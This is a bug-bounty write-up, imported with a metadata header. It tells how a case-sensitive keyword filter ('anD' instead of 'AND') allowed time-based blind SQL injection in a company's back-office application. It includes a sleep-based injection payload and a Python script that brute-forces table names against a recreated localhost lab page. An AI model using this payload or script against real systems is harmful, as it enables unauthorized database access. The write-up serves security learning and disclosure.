---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-05_story-of-blind-sql-with-a-typo-error.md
original_filename: 2020-06-05_story-of-blind-sql-with-a-typo-error.md
title: Story of Blind SQL with a typo error.
category: documents
detected_topics:
- sqli
- command-injection
- mobile-security
tags:
- imported
- documents
- sqli
- command-injection
- mobile-security
language: en
raw_sha256: f30fb73881f58086c4b2d53c564e26e1cc3c2a30f0ce971929d4c6fdd2e2358d
text_sha256: 7ec2dc282d1aa524ae8eb4dc4571a747f5cc5c82e73072fb8131ba5851b40932
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Story of Blind SQL with a typo error.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-05_story-of-blind-sql-with-a-typo-error.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `f30fb73881f58086c4b2d53c564e26e1cc3c2a30f0ce971929d4c6fdd2e2358d`
- Text SHA256: `7ec2dc282d1aa524ae8eb4dc4571a747f5cc5c82e73072fb8131ba5851b40932`


## Content

---
title: "Story of Blind SQL with a typo error."
url: "https://medium.com/@amyrahm786/story-of-blind-sql-with-a-typo-error-43a21913c8d"
authors: ["Amyrahm (@Amyrahm11)"]
bugs: ["SQL injection"]
publication_date: "2020-06-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4526
scraped_via: "browseros"
---

# Story of Blind SQL with a typo error.

Story of Blind SQL with a typo error.
Amyrahm
Follow
4 min read
·
Jun 5, 2020

112

2

T
his is one of my findings back in last year when I was testing a back-office application of a big company. As the application was on the old code base and equipped with fewer security features, I found a lot of bugs in my first sprint. Which I duly submitted to the company. Seeing the volume of issues from sqli to RCE company decided to update their framework with a newer code base and asked me to pause my testing on that.

As the application was wide they worked on a modular basis and asked me to carry my test the same before deployment.

In this article, I would just like to highlight one of the bugs regarding the SQL-injection, where the developer goofed up in the implementation of secure code and left the application vulnerable.

Though I cant highlight the domain name or paste a screenshot of the original application due to privacy policy.

One more time I have come up with a similar application(coded for this writeup) only.

Application interface

In one of the page application was taking input from user and was giving the output to the user back. Minus CSS/few more output application was more or less like the screenshot above

Whenever a user used to supply a product ID, it would give relevant information about the same.

so if you have seen the video you can see that on supplying quotes or SQL injection statements it was blocking our request.so I thought that they have patched the endpoints against SQL.nothing to test. Since I was nothing to report anything new to the company on this module I thought to check the defense in depth.

Get Amyrahm’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I took the application to burp and started fiddling since I had a background of my last test and I had kept the data from my last test. I thought to build up from there. I tried encoding , double encoding, and , or ,time-based everything nothing worked

Press enter or click to view image in full size
Press enter or click to view image in full size
Press enter or click to view image in full size
Press enter or click to view image in full size

Even some weird stuff I also tried like converting the decimal to ASCII as application built on PHP so took a chance but nothing

Press enter or click to view image in full size

Till now you just saw everything I tried to exploit the scenarios but nothing I got now before I was just wrapping up my thing just had a typo error and I got a result of my desire. “AND” keyword was not filtred proper and was left to case-sensitive attack, though the same has been well implemented in other keywords and I found my blind SQL injection time-based. I quickly bring that in the notice to the company they quickly rectified the same.

Press enter or click to view image in full size

Now just using my old data in hand all I needed to craft and check the same with query

id=2 AND (select sleep(2) from {injection_word_list _for tables}) &submit=product_listing

Which can be done using intruder or any script easily.

import requests

def deciding_table(injected):
  url='http://localhost:8181/weblabs/sqli_bypass1.php'
  headers={'Host': 'localhost:8181',\
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',\
  'Cookie': 'PHPSESSID=ifpp57n3m4q943qmf6j2i23bq0',\
  'Content-Type': 'application/x-www-form-urlencoded'
  }

  data={'id':'2 anD (select sleep(2) from '+injected+')','submit':'product_listing'}

  print data

  r=requests.post(url=url,headers=headers,data=data)

  if (r.elapsed.total_seconds()>2):
  print "valid table name :" +injected
  exit()

def readtablename():
  path=r'D:\wordlist\databaselist.txt'
  with open(path) as fh:
  for line in fh:
  line=line.strip()
  deciding_table(str(line))

readtablename()
Press enter or click to view image in full size

P.S: I have changed the name of the table and various other parameters in order to hide the actual.

Takeaway from here:

Never take anything as granted some time little typo in code can make your day as a hunter.

if you like the article don't forget to share and clap.
